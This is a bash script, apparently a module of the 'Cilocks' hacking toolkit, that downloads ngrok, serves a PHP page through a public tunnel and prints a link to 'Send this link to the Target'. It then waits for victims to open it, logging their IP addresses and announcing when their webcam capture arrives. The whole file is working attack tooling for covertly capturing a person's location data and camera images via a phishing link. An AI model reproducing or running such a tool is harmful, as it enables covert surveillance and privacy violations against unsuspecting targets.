#!/usr/bin/env bash

getwebcam() {
    clear
    function cam() {
        banner
        echo -e "   Get WebCam {Over Internet}"
    }
    cam

    stop() {

        checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
        checkphp=$(ps aux | grep -o "php" | head -n1)
        checkssh=$(ps aux | grep -o "ssh" | head -n1)
        if [[ $checkngrok == *'ngrok'* ]]; then
            pkill -f -2 ngrok >/dev/null 2>&1
            killall -2 ngrok >/dev/null 2>&1
        fi

        if [[ $checkphp == *'php'* ]]; then
            killall -2 php >/dev/null 2>&1
        fi
        if [[ $checkssh == *'ssh'* ]]; then
            killall -2 ssh >/dev/null 2>&1
        fi
        exit 1

    }

    dependencies() {

        command -v php >/dev/null 2>&1 || {
            echo >&2 "Cilocks require php but it's not installed. Install it. Aborting."
            exit 1
        }

    }

    catch_ip() {

        ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
        IFS=$'\n'
        echo -e "IP:" "$ip"

        cat ip.txt >>saved.ip.txt

    }

    checkfound() {

        echo -e "\n"
        echo -e " Waiting targets, Press Ctrl + C to exit..."
        while [ true ]; do

            if [[ -e "ip.txt" ]]; then
                echo -e " Target opened the link!\n"
                echo -e " File saved as cam"
                catch_ip
                rm -rf ip.txt

            fi

            sleep 0.5

            if [[ -e "Log.log" ]]; then
                echo -e " Cam file received!"
                rm -rf Log.log
            fi
            sleep 0.5

        done

    }

    payload_ngrok() {

        link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z-]*\.ngrok.io")
        sed 's+forwarding_link+'"$link"'+g' tmp.html >index2.html
        sed 's+forwarding_link+'"$link"'+g' tmp.php >index.php

    }

    ngrok_server() {

        if [[ -e ngrok ]]; then
            echo ""
        else
            command -v unzip >/dev/null 2>&1 || {
                echo >&2 "Cilocks require unzip but it's not installed. Install it. Aborting."
                exit 1
            }
            command -v wget >/dev/null 2>&1 || {
                echo >&2 "Cilocks require wget but it's not installed. Install it. Aborting."
                exit 1
            }
            echo -e " Downloading Ngrok...\n"
            arch=$(uname -a | grep -o 'arm' | head -n1)
            arch2=$(uname -a | grep -o 'Android' | head -n1)
            if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]]; then
                wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip >/dev/null 2>&1

                if [[ -e ngrok-stable-linux-arm.zip ]]; then
                    unzip ngrok-stable-linux-arm.zip >/dev/null 2>&1
                    chmod +x ngrok
                    rm -rf ngrok-stable-linux-arm.zip
                else
                    echo -e "[!] Download error... Termux?Nethunter?, run: pkg install wget"
                    exit 1
                fi

            else
                wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip >/dev/null 2>&1
                if [[ -e ngrok-stable-linux-386.zip ]]; then
                    unzip ngrok-stable-linux-386.zip >/dev/null 2>&1
                    chmod +x ngrok
                    rm -rf ngrok-stable-linux-386.zip
                else
                    echo -e "[!] Download error... "
                    exit 1
                fi
            fi
        fi

        echo -e " [*] Starting php server..."
        php -S 127.0.0.1:3333 >/dev/null 2>&1 &
        sleep 2
        echo -e " [*] Starting ngrok server..."
        ./ngrok http 3333 >/dev/null 2>&1 &
        sleep 10

        link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z-]*\.ngrok.io")
        echo -e " [*] Send this link to the Target:" "$link"

        payload_ngrok
        checkfound
    }

    ngrok_serve() {
        ngrok_server
        sleep 1
        clear
        ngrok_serve

    }
    dependencies
    ngrok_serve
}
